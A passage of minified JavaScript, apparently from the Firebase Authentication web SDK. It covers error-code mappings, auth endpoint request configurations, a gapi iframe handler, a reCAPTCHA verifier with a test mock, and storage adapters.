            INVALID_PHONE_NUMBER: "invalid-phone-number",
            INVALID_SESSION_INFO: "invalid-verification-id",
            INVALID_TEMPORARY_PROOF: "invalid-credential",
            INVALID_TENANT_ID: "invalid-tenant-id",
            MISSING_APP_CREDENTIAL: "missing-app-credential",
            MISSING_CODE: "missing-verification-code",
            MISSING_PHONE_NUMBER: "missing-phone-number",
            MISSING_SESSION_INFO: "missing-verification-id",
            QUOTA_EXCEEDED: "quota-exceeded",
            SESSION_EXPIRED: "code-expired",
            REJECTED_CREDENTIAL: "rejected-credential",
            INVALID_CONTINUE_URI: "invalid-continue-uri",
            MISSING_ANDROID_PACKAGE_NAME: "missing-android-pkg-name",
            MISSING_IOS_BUNDLE_ID: "missing-ios-bundle-id",
            UNAUTHORIZED_DOMAIN: "unauthorized-continue-uri",
            INVALID_DYNAMIC_LINK_DOMAIN: "invalid-dynamic-link-domain",
            INVALID_OAUTH_CLIENT_ID: "invalid-oauth-client-id",
            INVALID_CERT_HASH: "invalid-cert-hash",
            UNSUPPORTED_TENANT_OPERATION: "unsupported-tenant-operation",
            TENANT_ID_MISMATCH: "tenant-id-mismatch",
            ADMIN_ONLY_OPERATION: "admin-restricted-operation",
            INVALID_MFA_PENDING_CREDENTIAL: "invalid-multi-factor-session",
            MFA_ENROLLMENT_NOT_FOUND: "multi-factor-info-not-found",
            MISSING_MFA_PENDING_CREDENTIAL: "missing-multi-factor-session",
            MISSING_MFA_ENROLLMENT_ID: "missing-multi-factor-info",
            EMAIL_CHANGE_NEEDS_VERIFICATION: "email-change-needs-verification",
            SECOND_FACTOR_EXISTS: "second-factor-already-in-use",
            SECOND_FACTOR_LIMIT_EXCEEDED:
              "maximum-second-factor-count-exceeded",
            UNSUPPORTED_FIRST_FACTOR: "unsupported-first-factor",
            UNVERIFIED_EMAIL: "unverified-email",
            API_KEY_SERVICE_BLOCKED: "api-key-service-blocked",
          }),
          (b = b || {})
        ),
        (b =
          (b = c.match(/^[^\s]+\s*:\s*([\s\S]*)$/)) && 1 < b.length
            ? b[1]
            : void 0),
        d))
          if (0 === c.indexOf(e)) return new P(d[e], b);
        return !b && a && (b = yl(a)), new P("internal-error", b);
      },
      hn = new Dl(3e4, 6e4),
      jn = { "Content-Type": "application/x-www-form-urlencoded" },
      kn = new Dl(3e4, 6e4),
      ln = { "Content-Type": "application/json" },
      un = "__fcb" + Math.floor(1e6 * Math.random()).toString(),
      In = { displayName: "DISPLAY_NAME", photoUrl: "PHOTO_URL" },
      eo = { endpoint: "setAccountInfo", oa: ao, Zb: "email", ta: !0 },
      co = {
        endpoint: "resetPassword",
        oa: ao,
        Aa: function (a) {
          var b = a.requestType;
          if (
            !b ||
            (!a.email && "EMAIL_SIGNIN" != b && "VERIFY_AND_CHANGE_EMAIL" != b)
          )
            throw new P("internal-error");
        },
        ta: !0,
      },
      fo = {
        endpoint: "signupNewUser",
        oa: function (a) {
          if ((yn(a), !a.password)) throw new P("weak-password");
        },
        Aa: En,
        Mb: !0,
        ta: !0,
      },
      An = { endpoint: "createAuthUri", ta: !0 },
      go = { endpoint: "deleteAccount", Ma: ["idToken"] },
      Sn = {
        endpoint: "setAccountInfo",
        Ma: ["idToken", "deleteProvider"],
        oa: function (a) {
          if (!Array.isArray(a.deleteProvider)) throw new P("internal-error");
        },
      },
      Lm = {
        endpoint: "emailLinkSignin",
        Ma: ["email", "oobCode"],
        oa: yn,
        Aa: En,
        Mb: !0,
        ta: !0,
      },
      Nm = {
        endpoint: "emailLinkSignin",
        Ma: ["idToken", "email", "oobCode"],
        oa: yn,
        Aa: En,
        Mb: !0,
      },
      ho = {
        endpoint: "accounts/mfaEnrollment:finalize",
        Ma: ["idToken", "phoneVerificationInfo"],
        oa: Qn,
        Aa: En,
        ta: !0,
        He: !0,
      },
      io = {
        endpoint: "accounts/mfaSignIn:finalize",
        Ma: ["mfaPendingCredential", "phoneVerificationInfo"],
        oa: Qn,
        Aa: En,
        ta: !0,
        He: !0,
      },
      jo = { endpoint: "getAccountInfo" },
      Kn = {
        endpoint: "getOobConfirmationCode",
        Ma: ["requestType"],
        oa: function (a) {
          if ("EMAIL_SIGNIN" != a.requestType) throw new P("internal-error");
          yn(a);
        },
        Zb: "email",
        ta: !0,
      },
      Ln = {
        endpoint: "getOobConfirmationCode",
        Ma: ["idToken", "requestType"],
        oa: function (a) {
          if ("VERIFY_EMAIL" != a.requestType) throw new P("internal-error");
        },
        Zb: "email",
        ta: !0,
      },
      Mn = {
        endpoint: "getOobConfirmationCode",
        Ma: ["idToken", "newEmail", "requestType"],
        oa: function (a) {
          if ("VERIFY_AND_CHANGE_EMAIL" != a.requestType)
            throw new P("internal-error");
        },
        Zb: "email",
        ta: !0,
      },
      Jn = {
        endpoint: "getOobConfirmationCode",
        Ma: ["requestType"],
        oa: function (a) {
          if ("PASSWORD_RESET" != a.requestType) throw new P("internal-error");
          yn(a);
        },
        Zb: "email",
        ta: !0,
      },
      Cn = { ng: !0, endpoint: "getProjectConfig", httpMethod: "GET" },
      ko = {
        ng: !0,
        endpoint: "getRecaptchaParam",
        httpMethod: "GET",
        Aa: function (a) {
          if (!a.recaptchaSiteKey) throw new P("internal-error");
        },
      },
      bo = { endpoint: "resetPassword", oa: ao, Zb: "email", ta: !0 },
      Nn = {
        endpoint: "sendVerificationCode",
        Ma: ["phoneNumber", "recaptchaToken"],
        Zb: "sessionInfo",
        ta: !0,
      },
      Hn = { endpoint: "setAccountInfo", Ma: ["idToken"], oa: zn, Mb: !0 },
      Om = {
        endpoint: "setAccountInfo",
        Ma: ["idToken"],
        oa: function (a) {
          if ((zn(a), !a.password)) throw new P("weak-password");
        },
        Aa: En,
        Mb: !0,
      },
      Gn = { endpoint: "signupNewUser", Aa: En, Mb: !0, ta: !0 },
      Pn = {
        endpoint: "accounts/mfaEnrollment:start",
        Ma: ["idToken", "phoneEnrollmentInfo"],
        oa: function (a) {
          if (!a.phoneEnrollmentInfo) throw new P("internal-error");
          if (!a.phoneEnrollmentInfo.phoneNumber)
            throw new P("missing-phone-number");
          if (!a.phoneEnrollmentInfo.recaptchaToken)
            throw new P("missing-app-credential");
        },
        Aa: function (a) {
          if (!a.phoneSessionInfo || !a.phoneSessionInfo.sessionInfo)
            throw new P("internal-error");
        },
        ta: !0,
        He: !0,
      },
      Rn = {
        endpoint: "accounts/mfaSignIn:start",
        Ma: ["mfaPendingCredential", "mfaEnrollmentId", "phoneSignInInfo"],
        oa: function (a) {
          if (!a.phoneSignInInfo || !a.phoneSignInInfo.recaptchaToken)
            throw new P("missing-app-credential");
        },
        Aa: function (a) {
          if (!a.phoneResponseInfo || !a.phoneResponseInfo.sessionInfo)
            throw new P("internal-error");
        },
        ta: !0,
        He: !0,
      },
      Yn = {
        endpoint: "verifyAssertion",
        oa: Un,
        Hf: Vn,
        Aa: Xn,
        Mb: !0,
        ta: !0,
      },
      $n = {
        endpoint: "verifyAssertion",
        oa: Un,
        Hf: Vn,
        Aa: function (a) {
          if (a.errorMessage && "USER_NOT_FOUND" == a.errorMessage)
            throw new P("user-not-found");
          if (a.errorMessage) throw Wn(a.errorMessage);
          En(a);
        },
        Mb: !0,
        ta: !0,
      },
      Zn = {
        endpoint: "verifyAssertion",
        oa: function (a) {
          if ((Un(a), !a.idToken)) throw new P("internal-error");
        },
        Hf: Vn,
        Aa: Xn,
        Mb: !0,
      },
      lo = {
        endpoint: "verifyCustomToken",
        oa: function (a) {
          if (!a.token) throw new P("invalid-custom-token");
        },
        Aa: En,
        Mb: !0,
        ta: !0,
      },
      Mm = {
        endpoint: "verifyPassword",
        oa: function (a) {
          if ((yn(a), !a.password)) throw new P("wrong-password");
        },
        Aa: En,
        Mb: !0,
        ta: !0,
      },
      On = { endpoint: "verifyPhoneNumber", oa: Fn, Aa: En, ta: !0 },
      Um = {
        endpoint: "verifyPhoneNumber",
        oa: function (a) {
          if (!a.idToken) throw new P("internal-error");
          Fn(a);
        },
        Aa: function (a) {
          if (a.temporaryProof)
            throw ((a.code = "credential-already-in-use"), en(a));
          En(a);
        },
      },
      Vm = {
        ei: { USER_NOT_FOUND: "user-not-found" },
        endpoint: "verifyPhoneNumber",
        oa: Fn,
        Aa: En,
        ta: !0,
      },
      mo = {
        endpoint: "accounts/mfaEnrollment:withdraw",
        Ma: ["idToken", "mfaEnrollmentId"],
        Aa: function (a) {
          if (!!a.idToken ^ !!a.refreshToken) throw new P("internal-error");
        },
        ta: !0,
        He: !0,
      },
      no = ha(["https://apis.google.com/js/api.js?onload=", ""]),
      po = function (a) {
        (this.hb = a), (this.kf = null), (this.Yg = oo(this));
      };
    po.prototype.onReady = function () {
      return this.Yg;
    };
    var oo = function (a) {
      return qo().then(function () {
        return new E(function (b, c) {
          N("gapi.iframes.getContext")().open(
            {
              where: document.body,
              url: a.hb,
              messageHandlersFilter: N(
                "gapi.iframes.CROSS_ORIGIN_IFRAMES_FILTER"
              ),
              attributes: {
                style: {
                  position: "absolute",
                  top: "-100px",
                  width: "1px",
                  height: "1px",
                },
              },
              dontclear: !0,
            },
            function (d) {
              (a.kf = d), a.kf.restyle({ setHideOnLeave: !1 });
              var e = setTimeout(function () {
                  c(Error("Network Error"));
                }, ro.get()),
                f = function () {
                  clearTimeout(e), b();
                };
              d.ping(f).then(f, function () {
                c(Error("Network Error"));
              });
            }
          );
        });
      });
    };
    (po.prototype.sendMessage = function (a) {
      var b = this;
      return this.Yg.then(function () {
        return new E(function (c) {
          b.kf.send(
            a.type,
            a,
            c,
            N("gapi.iframes.CROSS_ORIGIN_IFRAMES_FILTER")
          );
        });
      });
    }),
      (po.prototype.qh = function (a, b) {
        var c = this;
        this.Yg.then(function () {
          c.kf.register(a, b, N("gapi.iframes.CROSS_ORIGIN_IFRAMES_FILTER"));
        });
      });
    var qo = function () {
        return (
          so ||
          (so = new E(function (a, b) {
            var c = function () {
              Cl(),
                N("gapi.load")("gapi.iframes", {
                  callback: a,
                  ontimeout: function () {
                    Cl(), b(Error("Network Error"));
                  },
                  timeout: to.get(),
                });
            };
            if (N("gapi.iframes.Iframe")) a();
            else if (N("gapi.load")) c();
            else {
              var d =
                "__iframefcb" + Math.floor(1e6 * Math.random()).toString();
              (p[d] = function () {
                N("gapi.load") ? c() : b(Error("Network Error"));
              }),
                (d = nc(no, d)),
                F(gk(d)).l(function () {
                  b(Error("Network Error"));
                });
            }
          }).l(function (a) {
            throw ((so = null), a);
          }))
        );
      },
      to = new Dl(3e4, 6e4),
      ro = new Dl(5e3, 15e3),
      so = null,
      uo = function (a, b, c, d) {
        (this.ya = a),
          (this.ha = b),
          (this.ka = c),
          (this.N = d),
          (this.Wc = null),
          this.N
            ? ((a = M(this.N.url)),
              (a = Nk(a.Va, a.Ga, a.Tb, "/emulator/auth/iframe")))
            : (a = Nk("https", this.ya, null, "/__/auth/iframe")),
          (this.hc = a),
          L(this.hc, "apiKey", this.ha),
          L(this.hc, "appName", this.ka),
          (this.Ia = null),
          (this.Ea = []);
      };
    (uo.prototype.Dh = function (a) {
      return (this.Wc = a), this;
    }),
      (uo.prototype.Ah = function (a) {
        return (this.Ia = a), this;
      }),
      (uo.prototype.toString = function () {
        return (
          this.Wc ? L(this.hc, "v", this.Wc) : this.hc.removeParameter("v"),
          this.Ia ? L(this.hc, "eid", this.Ia) : this.hc.removeParameter("eid"),
          this.Ea.length
            ? L(this.hc, "fw", this.Ea.join(","))
            : this.hc.removeParameter("fw"),
          this.hc.toString()
        );
      });
    var vo = function (a, b, c, d, e, f) {
      (this.ya = a),
        (this.ha = b),
        (this.ka = c),
        (this.nk = d),
        (this.N = f),
        (this.Wc = this.Ja = this.oh = null),
        (this.Bd = e),
        (this.ma = this.Ia = null);
    };
    (vo.prototype.Ch = function (a) {
      return (this.ma = a), this;
    }),
      (vo.prototype.Dh = function (a) {
        return (this.Wc = a), this;
      }),
      (vo.prototype.Ah = function (a) {
        return (this.Ia = a), this;
      }),
      (vo.prototype.toString = function () {
        if (this.N) {
          var a = M(this.N.url);
          a = Nk(a.Va, a.Ga, a.Tb, "/emulator/auth/handler");
        } else a = Nk("https", this.ya, null, "/__/auth/handler");
        if (
          (L(a, "apiKey", this.ha),
          L(a, "appName", this.ka),
          L(a, "authType", this.nk),
          this.Bd.isOAuthProvider)
        ) {
          var b = this.Bd;
          try {
            var c = firebase.app(this.ka).auth().Gb;
          } catch (h) {
            c = null;
          }
          for (var d in ((b.xg = c),
          L(a, "providerId", this.Bd.providerId),
          (c = this.Bd),
          (b = zl(c.fi))))
            b[d] = b[d].toString();
          (d = c.Tl), (b = Za(b));
          for (var e = 0; e < d.length; e++) {
            var f = d[e];
            f in b && delete b[f];
          }
          c.Sg && c.xg && !b[c.Sg] && (b[c.Sg] = c.xg),
            Ya(b) || L(a, "customParameters", yl(b));
        }
        if (
          ("function" == typeof this.Bd.zi &&
            (c = this.Bd.zi()).length &&
            L(a, "scopes", c.join(",")),
          this.oh
            ? L(a, "redirectUrl", this.oh)
            : a.removeParameter("redirectUrl"),
          this.Ja ? L(a, "eventId", this.Ja) : a.removeParameter("eventId"),
          this.Wc ? L(a, "v", this.Wc) : a.removeParameter("v"),
          this.Ke)
        )
          for (var g in this.Ke)
            this.Ke.hasOwnProperty(g) && !Mk(a, g) && L(a, g, this.Ke[g]);
        return (
          this.ma ? L(a, "tid", this.ma) : a.removeParameter("tid"),
          this.Ia ? L(a, "eid", this.Ia) : a.removeParameter("eid"),
          (g = wo(this.ka)).length && L(a, "fw", g.join(",")),
          a.toString()
        );
      });
    var wo = function (a) {
        try {
          return Ua(firebase.app(a).auth().Ea);
        } catch (b) {
          return [];
        }
      },
      xo = function (a, b, c, d, e, f) {
        (this.ya = a),
          (this.ha = b),
          (this.ka = c),
          (this.N = f),
          (this.Ec = d || null),
          (this.Ia = e || null),
          (this.o = this.Lg = this.wi = null),
          (this.Vb = []),
          (this.nf = this.Hb = null);
      },
      yo = function (a) {
        var b = b || Xk();
        return Dn(a).then(function (c) {
          if (!gl(c, b)) throw new jm(Xk());
        });
      };
    (k = xo.prototype),
      (k.initialize = function () {
        if (this.nf) return this.nf;
        var a = this;
        return (this.nf = il().then(function () {
          if (!a.Lg) {
            var b = a.ya,
              c = a.ha,
              d = a.ka,
              e = a.Ec,
              f = a.Ia,
              g = wo(a.ka);
            ((b = new uo(b, c, d, a.N).Dh(e).Ah(f)).Ea = Ua(g || [])),
              (a.Lg = b.toString());
          }
          (a.jf = new po(a.Lg)), a.rh();
        }));
      }),
      (k.Ae = function (a, b, c) {
        var d = new P("popup-closed-by-user"),
          e = new P("web-storage-unsupported"),
          f = this,
          g = !1;
        return this.Nc()
          .then(function () {
            zo(f).then(function (h) {
              h || (a && cl(a), b(e), (g = !0));
            });
          })
          .l(function () {})
          .then(function () {
            if (!g) return el(a);
          })
          .then(function () {
            if (!g)
              return ik(c).then(function () {
                b(d);
              });
          });
      }),
      (k.Mj = function () {
        var a = Vk();
        return !xl(a) && !Bl(a);
      }),
      (k.Ei = function () {
        return !1;
      }),
      (k.qe = function (a, b, c, d, e, f, g, h) {
        if (!a) return G(new P("popup-blocked"));
        if (g && !xl())
          return (
            this.Nc().l(function (m) {
              cl(a), e(m);
            }),
            d(),
            F()
          );
        this.Hb || (this.Hb = yo(Ao(this)));
        var l = this;
        return this.Hb.then(function () {
          var m = l.Nc().l(function (q) {
            throw (cl(a), e(q), q);
          });
          return d(), m;
        })
          .then(function () {
            if ((cn(c), !g)) {
              var m = Bo(
                l.ya,
                l.ha,
                l.ka,
                b,
                c,
                null,
                f,
                l.Ec,
                void 0,
                l.Ia,
                h,
                l.N
              );
              Yk(m, a);
            }
          })
          .l(function (m) {
            throw ("auth/network-request-failed" == m.code && (l.Hb = null), m);
          });
      });
    var Ao = function (a) {
      return (
        a.o ||
          ((a.wi = a.Ec ? sl("JsCore", a.Ec, wo(a.ka)) : null),
          (a.o = new mn(a.ha, Tk(a.Ia), a.wi)),
          a.N && qn(a.o, a.N)),
        a.o
      );
    };
    (xo.prototype.re = function (a, b, c, d) {
      this.Hb || (this.Hb = yo(Ao(this)));
      var e = this;
      return this.Hb.then(function () {
        cn(b);
        var f = Bo(e.ya, e.ha, e.ka, a, b, Xk(), c, e.Ec, void 0, e.Ia, d, e.N);
        Yk(f);
      }).l(function (f) {
        throw ("auth/network-request-failed" == f.code && (e.Hb = null), f);
      });
    }),
      (xo.prototype.Nc = function () {
        var a = this;
        return this.initialize()
          .then(function () {
            return a.jf.onReady();
          })
          .l(function () {
            throw ((a.Hb = null), new P("network-request-failed"));
          });
      }),
      (xo.prototype.Sj = function () {
        return !0;
      });
    var Bo = function (a, b, c, d, e, f, g, h, l, m, q, y) {
      return (
        ((a = new vo(a, b, c, d, e, y)).oh = f),
        (a.Ja = g),
        ((f = a.Dh(h)).Ke = Za(l || null)),
        f.Ah(m).Ch(q).toString()
      );
    };
    xo.prototype.rh = function () {
      if (!this.jf) throw Error("IfcHandler must be initialized!");
      var a = this;
      this.jf.qh("authEvent", function (b) {
        var c = {};
        if (b && b.authEvent) {
          var d = !1;
          for (b = $l(b.authEvent), c = 0; c < a.Vb.length; c++)
            d = a.Vb[c](b) || d;
          return ((c = {}).status = d ? "ACK" : "ERROR"), F(c);
        }
        return (c.status = "ERROR"), F(c);
      });
    };
    var zo = function (a) {
      var b = { type: "webStorageSupport" };
      return a
        .initialize()
        .then(function () {
          return a.jf.sendMessage(b);
        })
        .then(function (c) {
          if (c && c.length && void 0 !== c[0].webStorageSupport)
            return c[0].webStorageSupport;
          throw Error();
        });
    };
    function Co() {}
    (xo.prototype.Cc = function (a) {
      this.Vb.push(a);
    }),
      (xo.prototype.Ed = function (a) {
        Ta(this.Vb, function (b) {
          return b == a;
        });
      }),
      (Co.prototype.render = function () {}),
      (Co.prototype.reset = function () {}),
      (Co.prototype.getResponse = function () {}),
      (Co.prototype.execute = function () {});
    var Do = ha([
        "https://www.google.com/recaptcha/api.js?trustedtypes=true&onload=",
        "&render=explicit&hl=",
        "",
      ]),
      Eo = function () {
        (this.hd = p.grecaptcha ? 1 / 0 : 0),
          (this.Gi = null),
          (this.qg = "__rcb" + Math.floor(1e6 * Math.random()).toString());
      };
    (Eo.prototype.Ui = function (a) {
      var b = this;
      return new E(function (c, d) {
        var e = setTimeout(function () {
          d(new P("network-request-failed"));
        }, Fo.get());
        if (!p.grecaptcha || (a !== b.Gi && !b.hd)) {
          p[b.qg] = function () {
            if (p.grecaptcha) {
              b.Gi = a;
              var g = p.grecaptcha.render;
              (p.grecaptcha.render = function (h, l) {
                return (h = g(h, l)), b.hd++, h;
              }),
                clearTimeout(e),
                c(p.grecaptcha);
            } else clearTimeout(e), d(new P("internal-error"));
            delete p[b.qg];
          };
          var f = nc(Do, b.qg, a || "");
          F(gk(f)).l(function () {
            clearTimeout(e),
              d(
                new P(
                  "internal-error",
                  "Unable to load external reCAPTCHA dependencies!"
                )
              );
          });
        } else clearTimeout(e), c(p.grecaptcha);
      });
    }),
      (Eo.prototype.Yh = function () {
        this.hd--;
      });
    var Fo = new Dl(3e4, 6e4),
      Go = null,
      Ho = function () {
        (this.ab = {}), (this.hd = 1e12);
      };
    (Ho.prototype.render = function (a, b) {
      return (this.ab[this.hd.toString()] = new Io(a, b)), this.hd++;
    }),
      (Ho.prototype.reset = function (a) {
        var b = Jo(this, a);
        (a = Ko(a)), b && a && (b.delete(), delete this.ab[a]);
      }),
      (Ho.prototype.getResponse = function (a) {
        return (a = Jo(this, a)) ? a.getResponse() : null;
      }),
      (Ho.prototype.execute = function (a) {
        (a = Jo(this, a)) && a.execute();
      });
    var Jo = function (a, b) {
        return ((b = Ko(b)) && a.ab[b]) || null;
      },
      Ko = function (a) {
        return (a = void 0 === a ? 1e12 : a) ? a.toString() : null;
      },
      Lo = null,
      Io = function (a, b) {
        (this.wb = !1),
          (this.wa = b),
          (this.Kd = this.If = null),
          (this.Qi = "invisible" !== this.wa.size),
          (this.li = Pc(a));
        var c = this;
        (this.dj = function () {
          c.execute();
        }),
          this.Qi ? this.execute() : nj(this.li, "click", this.dj);
      };
    (Io.prototype.getResponse = function () {
      return Mo(this), this.If;
    }),
      (Io.prototype.execute = function () {
        Mo(this);
        var a = this;
        this.Kd ||
          (this.Kd = setTimeout(function () {
            a.If = ql();
            var b = a.wa.callback,
              c = a.wa["expired-callback"];
            if (b)
              try {
                b(a.If);
              } catch (d) {}
            a.Kd = setTimeout(function () {
              if (((a.Kd = null), (a.If = null), c))
                try {
                  c();
                } catch (d) {}
              a.Qi && a.execute();
            }, 6e4);
          }, 500));
      }),
      (Io.prototype.delete = function () {
        Mo(this),
          (this.wb = !0),
          clearTimeout(this.Kd),
          (this.Kd = null),
          vj(this.li, "click", this.dj);
      });
    var Mo = function (a) {
        if (a.wb) throw Error("reCAPTCHA mock was already deleted!");
      },
      No = function () {};
    (No.prototype.Ui = function () {
      return Lo || (Lo = new Ho()), F(Lo);
    }),
      (No.prototype.Yh = function () {});
    var Oo = null,
      Po = function (a, b, c, d, e, f, g) {
        if (
          (O(this, "type", "recaptcha"),
          (this.Od = this.Rd = null),
          (this.jd = !1),
          (this.ai = b),
          (this.be = null),
          g
            ? (Oo || (Oo = new No()), (g = Oo))
            : (Go || (Go = new Eo()), (g = Go)),
          (this.xj = g),
          (this.tc = c || { theme: "light", type: "image" }),
          (this.Ka = []),
          this.tc.sitekey)
        )
          throw new P(
            "argument-error",
            "sitekey should not be provided for reCAPTCHA as one is automatically provisioned for the current project."
          );
        if (((this.qf = "invisible" === this.tc.size), !p.document))
          throw new P(
            "operation-not-supported-in-this-environment",
            "RecaptchaVerifier is only supported in a browser HTTP/HTTPS environment with DOM support."
          );
        if (!Pc(b) || (!this.qf && Pc(b).hasChildNodes()))
          throw new P(
            "argument-error",
            "reCAPTCHA container is either not found or already contains inner elements!"
          );
        (this.o = new mn(a, f || null, e || null)),
          (this.Ok =
            d ||
            function () {
              return null;
            });
        var h = this;
        this.Tf = [];
        var l = this.tc.callback;
        this.tc.callback = function (q) {
          if ((h.Ud(q), "function" == typeof l)) l(q);
          else if ("string" == typeof l) {
            var y = N(l, p);
            "function" == typeof y && y(q);
          }
        };
        var m = this.tc["expired-callback"];
        this.tc["expired-callback"] = function () {
          if ((h.Ud(null), "function" == typeof m)) m();
          else if ("string" == typeof m) {
            var q = N(m, p);
            "function" == typeof q && q();
          }
        };
      };
    Po.prototype.Ud = function (a) {
      for (var b = 0; b < this.Tf.length; b++)
        try {
          this.Tf[b](a);
        } catch (c) {}
    };
    var Qo = function (a, b) {
      Ta(a.Tf, function (c) {
        return c == b;
      });
    };
    (k = Po.prototype),
      (k.v = function (a) {
        var b = this;
        return (
          this.Ka.push(a),
          a.Ac(function () {
            Ra(b.Ka, a);
          }),
          a
        );
      }),
      (k.fe = function () {
        var a = this;
        return this.Rd
          ? this.Rd
          : (this.Rd = this.v(
              F()
                .then(function () {
                  if (vl() && !nl()) return il();
                  throw new P(
                    "operation-not-supported-in-this-environment",
                    "RecaptchaVerifier is only supported in a browser HTTP/HTTPS environment."
                  );
                })
                .then(function () {
                  return a.xj.Ui(a.Ok());
                })
                .then(function (b) {
                  return (a.be = b), Q(a.o, ko, {});
                })
                .then(function (b) {
                  a.tc.sitekey = b.recaptchaSiteKey;
                })
                .l(function (b) {
                  throw ((a.Rd = null), b);
                })
            ));
      }),
      (k.render = function () {
        Ro(this);
        var a = this;
        return this.v(
          this.fe().then(function () {
            if (null === a.Od) {
              var b = a.ai;
              if (!a.qf) {
                var c = Pc(b);
                (b = Tc("DIV")), c.appendChild(b);
              }
              a.Od = a.be.render(b, a.tc);
            }
            return a.Od;
          })
        );
      }),
      (k.verify = function () {
        Ro(this);
        var a = this;
        return this.v(
          this.render().then(function (b) {
            return new E(function (c) {
              var d = a.be.getResponse(b);
              if (d) c(d);
              else {
                var e = function (f) {
                  f && (Qo(a, e), c(f));
                };
                a.Tf.push(e), a.qf && a.be.execute(a.Od);
              }
            });
          })
        );
      }),
      (k.reset = function () {
        Ro(this), null !== this.Od && this.be.reset(this.Od);
      });
    var Ro = function (a) {
      if (a.jd)
        throw new P(
          "internal-error",
          "RecaptchaVerifier instance has been destroyed."
        );
    };
    Po.prototype.clear = function () {
      Ro(this), (this.jd = !0), this.xj.Yh();
      for (var a = 0; a < this.Ka.length; a++)
        this.Ka[a].cancel("RecaptchaVerifier instance has been destroyed.");
      this.qf || Wc(Pc(this.ai));
    };
    var So = function (a, b, c) {
      var d = !1;
      try {
        this.U = c || firebase.app();
      } catch (g) {
        throw new P(
          "argument-error",
          "No firebase.app.App instance is currently initialized."
        );
      }
      if (!this.U.options || !this.U.options.apiKey)
        throw new P("invalid-api-key");
      c = this.U.options.apiKey;
      var e = this,
        f = null;
      try {
        f = Ua(this.U.auth().Ea);
      } catch (g) {}
      try {
        d = this.U.auth().settings.appVerificationDisabledForTesting;
      } catch (g) {}
      (f = firebase.SDK_VERSION ? sl("JsCore", firebase.SDK_VERSION, f) : null),
        Po.call(
          this,
          c,
          a,
          b,
          function () {
            try {
              var g = e.U.auth().Gb;
            } catch (h) {
              g = null;
            }
            return g;
          },
          f,
          Tk(Uk),
          d
        );
    };
    v(So, Po);
    var To = function (a) {
      this.Je = a;
    };
    To.prototype.postMessage = function (a, b) {
      this.Je.postMessage(a, b);
    };
    var Uo = function (a) {
      (this.Nl = a), (this.Zh = !1), (this.vf = []);
    };
    Uo.prototype.send = function (a, b, c) {
      c = void 0 !== c && c;
      var e,
        d = this;
      b = (b = void 0 === b ? null : b) || {};
      var f,
        g,
        h,
        l = null;
      if (this.Zh) return G(Error("connection_unavailable"));
      var m = c ? 800 : 50,
        q = "undefined" != typeof MessageChannel ? new MessageChannel() : null;
      return new E(function (y, B) {
        q
          ? ((e = "" + Math.floor(Math.random() * Math.pow(10, 20)).toString()),
            q.port1.start(),
            (g = setTimeout(function () {
              B(Error("unsupported_event"));
            }, m)),
            (l = {
              messageChannel: q,
              onMessage: (f = function (S) {
                S.data.eventId === e &&
                  ("ack" === S.data.status
                    ? (clearTimeout(g),
                      (h = setTimeout(function () {
                        B(Error("timeout"));
                      }, 3e3)))
                    : "done" === S.data.status
                    ? (clearTimeout(h),
                      void 0 !== S.data.response
                        ? y(S.data.response)
                        : B(Error("unknown_error")))
                    : (clearTimeout(g),
                      clearTimeout(h),
                      B(Error("invalid_response"))));
              }),
            }),
            d.vf.push(l),
            q.port1.addEventListener("message", f),
            d.Nl.postMessage({ eventType: a, eventId: e, data: b }, [q.port2]))
          : B(Error("connection_unavailable"));
      })
        .then(function (y) {
          return Vo(d, l), y;
        })
        .l(function (y) {
          throw (Vo(d, l), y);
        });
    };
    var Vo = function (a, b) {
      if (b) {
        var c = b.messageChannel,
          d = b.onMessage;
        c && (c.port1.removeEventListener("message", d), c.port1.close()),
          Ta(a.vf, function (e) {
            return e == b;
          });
      }
    };
    Uo.prototype.close = function () {
      for (; 0 < this.vf.length; ) Vo(this, this.vf[0]);
      this.Zh = !0;
    };
    var Wo = function (a) {
        (this.Bg = a), (this.Db = {}), (this.Xi = u(this.Sk, this));
      },
      Yo = function (a) {
        if (
          (x(Xo, function (c) {
            c.Bg == a && (b = c);
          }),
          !b)
        ) {
          var b = new Wo(a);
          Xo.push(b);
        }
        return b;
      };
    (Wo.prototype.Sk = function (a) {
      var b = a.data.eventType,
        c = a.data.eventId,
        d = this.Db[b];
      if (d && 0 < d.length) {
        a.ports[0].postMessage({
          status: "ack",
          eventId: c,
          eventType: b,
          response: null,
        });
        var e = [];
        x(d, function (f) {
          e.push(
            F().then(function () {
              return f(a.origin, a.data.data);
            })
          );
        }),
          tg(e).then(function (f) {
            var g = [];
            x(f, function (h) {
              g.push({
                fulfilled: h.vi,
                value: h.value,
                reason: h.reason ? h.reason.message : void 0,
              });
            }),
              x(g, function (h) {
                for (var l in h) void 0 === h[l] && delete h[l];
              }),
              a.ports[0].postMessage({
                status: "done",
                eventId: c,
                eventType: b,
                response: g,
              });
          });
      }
    }),
      (Wo.prototype.subscribe = function (a, b) {
        Ya(this.Db) && this.Bg.addEventListener("message", this.Xi),
          void 0 === this.Db[a] && (this.Db[a] = []),
          this.Db[a].push(b);
      }),
      (Wo.prototype.unsubscribe = function (a, b) {
        void 0 !== this.Db[a] && b
          ? (Ta(this.Db[a], function (c) {
              return c == b;
            }),
            0 == this.Db[a].length && delete this.Db[a])
          : b || delete this.Db[a],
          Ya(this.Db) && this.Bg.removeEventListener("message", this.Xi);
      });
    var Xo = [],
      Zo = function (a) {
        if (
          ((this.tb =
            a ||
            (firebase.INTERNAL.reactNative &&
              firebase.INTERNAL.reactNative.AsyncStorage)),
          !this.tb)
        )
          throw new P(
            "internal-error",
            "The React Native compatibility library was not found."
          );
        this.type = "asyncStorage";
      };
    function $o() {
      (this.storage = {}), (this.type = "inMemory");
    }
    (k = Zo.prototype),
      (k.get = function (a) {
        return F(this.tb.getItem(a)).then(function (b) {
          return b && Al(b);
        });
      }),
      (k.set = function (a, b) {
        return F(this.tb.setItem(a, yl(b)));
      }),
      (k.remove = function (a) {
        return F(this.tb.removeItem(a));
      }),
      (k.mc = function () {}),
      (k.zc = function () {}),
      (k = $o.prototype),
      (k.get = function (a) {
        return F(this.storage[a]);
      }),
      (k.set = function (a, b) {
        return (this.storage[a] = b), F();
      }),
      (k.remove = function (a) {
        return delete this.storage[a], F();
      }),
      (k.mc = function () {}),
      (k.zc = function () {});
    var cp = function () {
        if (!ap()) {
          if ("Node" == ol())
            throw new P(
              "internal-error",
              "The LocalStorage compatibility library was not found."
            );
          throw new P("web-storage-unsupported");
        }
        (this.tb = bp() || firebase.INTERNAL.node.localStorage),
          (this.type = "localStorage");
      },
      bp = function () {
        try {
          var a = p.localStorage,
            b = tl();
